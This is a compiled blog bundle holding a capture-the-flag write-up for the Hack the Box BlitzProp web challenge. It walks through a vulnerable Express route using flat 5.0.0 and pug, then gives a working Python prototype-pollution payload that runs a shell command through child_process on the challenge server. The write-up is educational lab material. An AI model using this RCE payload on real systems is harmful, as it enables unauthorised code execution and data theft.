"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[2878],{2714:(e,t,n)=>{n.d(t,{A:()=>r});n(6540);const o={"donate-card":"donate-card_mbts",bmac:"bmac_qmhE"};var s=n(4848);function r(){return(0,s.jsx)("div",{className:"alert alert--primary",role:"alert",children:(0,s.jsxs)("div",{className:"card__body",children:[(0,s.jsx)("p",{children:"Thank you for reading!"}),(0,s.jsx)("p",{children:"The information in this blog, as well as all the tools, apps and libraries I develop are currently open source."}),(0,s.jsx)("p",{children:"I would love to keep it this way, and you can help!"}),(0,s.jsx)("p",{children:"You can buy me a coffee from here, which will go towards the next all-nighter I pull off!"}),(0,s.jsx)("a",{href:"https://www.buymeacoffee.com/kblagoev",target:"_blank",children:(0,s.jsx)("img",{src:"https://cdn.buymeacoffee.com/buttons/v2/default-violet.png",className:o.bmac,alt:"Buy Me A Coffee"})}),(0,s.jsxs)("p",{children:["Or you can support me and my code monthly over at ",(0,s.jsx)("a",{href:"https://github.com/sponsors/tihawk",target:"_blank",children:"Github Sponsors!"})]}),(0,s.jsx)("p",{children:"Thanks!"})]})})}},5580:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>l,default:()=>d,frontMatter:()=>a,metadata:()=>i,toc:()=>p});var o=n(4848),s=n(8453),r=n(2714);const a={slug:"blitzprop-cyberapocalypse-2021-ctf",title:"BlitzProp - Cyberapocalypse 2021 CTF",description:"This is a writeup for the BlitzProp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",authors:"kiroki",tags:["Cyber Security","CTF"]},l=void 0,i={permalink:"/blog/blitzprop-cyberapocalypse-2021-ctf",source:"@site/blog/2021-04-30-10:45:31blitzprop-cyberapocalypse-2021-ctf.md",title:"BlitzProp - Cyberapocalypse 2021 CTF",description:"This is a writeup for the BlitzProp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",date:"2021-04-30T00:00:00.000Z",formattedDate:"April 30, 2021",tags:[{label:"Cyber Security",permalink:"/blog/tags/cyber-security"},{label:"CTF",permalink:"/blog/tags/ctf"}],readingTime:2.095,hasTruncateMarker:!0,authors:[{name:"Kiril Panayotov Blagoev",title:"Admin",url:"https://github.com/tihawk",imageURL:"https://github.com/tihawk.png",key:"kiroki"}],frontMatter:{slug:"blitzprop-cyberapocalypse-2021-ctf",title:"BlitzProp - Cyberapocalypse 2021 CTF",description:"This is a writeup for the BlitzProp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",authors:"kiroki",tags:["Cyber Security","CTF"]},unlisted:!1,prevItem:{title:"Input as a Service - Cyberapocalypse 2021 CTF",permalink:"/blog/input-as-a-service-cyberapocalypse-2021-ctf"},nextItem:{title:"CaaS - Cyberapocalypse 2021 CTF",permalink:"/blog/caas-cyberapocalypse-2021-ctf"}},c={authorsImageUrls:[void 0]},p=[{value:"Prompt",id:"prompt",level:3},{value:"Recon",id:"recon",level:3},{value:"Solution",id:"solution",level:3}];function h(e){const t={a:"a",code:"code",em:"em",h3:"h3",p:"p",pre:"pre",strong:"strong",...(0,s.R)(),...e.components};return(0,o.jsxs)(o.Fragment,{children:[(0,o.jsx)(t.p,{children:"This is a writeup for the BlitzProp challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web."}),"\n",(0,o.jsx)(t.h3,{id:"prompt",children:"Prompt"}),"\n",(0,o.jsx)(t.p,{children:"A tribute page for the legendary alien band called BlitzProp!"}),"\n",(0,o.jsx)(t.h3,{id:"recon",children:"Recon"}),"\n",(0,o.jsx)(t.p,{children:"We're provided with the source code for a cute webpage, which allows us to vote for some song names using an input field."}),"\n",(0,o.jsxs)(t.p,{children:["By looking at the song names we're supposed to vote for, we could potentially notice some hints like ",(0,o.jsx)(t.strong,{children:"Polluting"})," and ",(0,o.jsx)(t.strong,{children:"AST"}),"."]}),"\n",(0,o.jsxs)(t.p,{children:["The site seems to be running on a ",(0,o.jsx)(t.code,{children:"node"})," environment with an ",(0,o.jsx)(t.code,{children:"express"})," server, so we can check out the routes handling file."]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-js",children:"const path              = require('path');\nconst express           = require('express');\nconst pug               = require('pug');\nconst { unflatten }     = require('flat');\nconst router            = express.Router();\n\nrouter.get('/', (req, res) => {\n    return res.sendFile(path.resolve('views/index.html'));\n});\n\nrouter.post('/api/submit', (req, res) => {\n    const { song } = unflatten(req.body);\n\n\t\tconsole.log(req.body)\n\t\tconsole.log(unflatten(req.body))\n\n\tif (song.name.includes('Not Polluting with the boys') || song.name.includes('ASTa la vista baby') || song.name.includes('The Galactic Rhymes') || song.name.includes('The Goose went wild')) {\n\t\treturn res.json({\n\t\t\t'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user:'guest' })\n\t\t});\n\t} else {\n\t\treturn res.json({\n\t\t\t'response': 'Please provide us with the name of an existing song.'\n\t\t});\n\t}\n});\n\nmodule.exports = router;\n"})}),"\n",(0,o.jsxs)(t.p,{children:["Looking closely, we see that the ",(0,o.jsx)(t.code,{children:"/api/submit"})," POST endpoint uses a module called ",(0,o.jsx)(t.code,{children:"flat"})," to unflatten a request body into json. The code also uses ",(0,o.jsx)(t.code,{children:"pug"})," for templating."]}),"\n",(0,o.jsxs)(t.p,{children:["We can check the versions of these libraries in the ",(0,o.jsx)(t.code,{children:"package.json"})," file."]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-json",children:'"dependencies": {\n    "express": "^4.17.1",\n    "flat": "5.0.0",\n    "pug": "^3.0.0"\n}\n'})}),"\n",(0,o.jsxs)(t.p,{children:["The version of flat used seems to be vulnerable to prototype pollution, and we can find information on the payloads we can use ",(0,o.jsx)(t.a,{href:"https://blog.p6.is/AST-Injection/#Example-1",children:"here"}),", finding an example exploiting ",(0,o.jsx)(t.code,{children:"pug"}),"."]}),"\n",(0,o.jsx)(t.h3,{id:"solution",children:"Solution"}),"\n",(0,o.jsxs)(t.p,{children:["By having the exploit at hand, we can write a simple script which will send a POST request with the required ",(0,o.jsx)(t.code,{children:"song.name"})," in the data, as well as with our payload."]}),"\n",(0,o.jsxs)(t.p,{children:["The payload itself will allow us to do ",(0,o.jsx)(t.em,{children:"Remote Code Execution"}),". More to the point, we will cat the flag file into the publically available ",(0,o.jsx)(t.code,{children:"/static/js"})," folder, so we can navigate to it after the pollution exploit."]}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{className:"language-python",children:'import requests\n\nTARGET_URL = \'http://46.101.44.190:32262\'\n\n# make pollution\nr=requests.post(TARGET_URL + \'/api/submit\', json = {\n    "song.name":"The Goose went wild",\n    "__proto__.block": {\n        "type": "Text", \n        "line": "process.mainModule.require(\'child_process\').execSync(\'cat flag* > static/js/main.js\')"\n    }\n})\n# execute\nrequests.get(TARGET_URL)\nprint(r.text)\n'})}),"\n",(0,o.jsx)(t.p,{children:"Now that we have executed our command, we simply go ahead and curl that flag file, and find our flag"}),"\n",(0,o.jsx)(t.pre,{children:(0,o.jsx)(t.code,{children:"CHTB{p0llute_with_styl3}\n"})}),"\n","\n","\n",(0,o.jsx)(r.A,{})]})}function d(e={}){const{wrapper:t}={...(0,s.R)(),...e.components};return t?(0,o.jsx)(t,{...e,children:(0,o.jsx)(h,{...e})}):h(e)}},8453:(e,t,n)=>{n.d(t,{R:()=>a,x:()=>l});var o=n(6540);const s={},r=o.createContext(s);function a(e){const t=o.useContext(r);return o.useMemo((function(){return"function"==typeof e?e(t):{...t,...e}}),[t,e])}function l(e){let t;return t=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:a(e.components),o.createElement(r.Provider,{value:t},e.children)}}}]);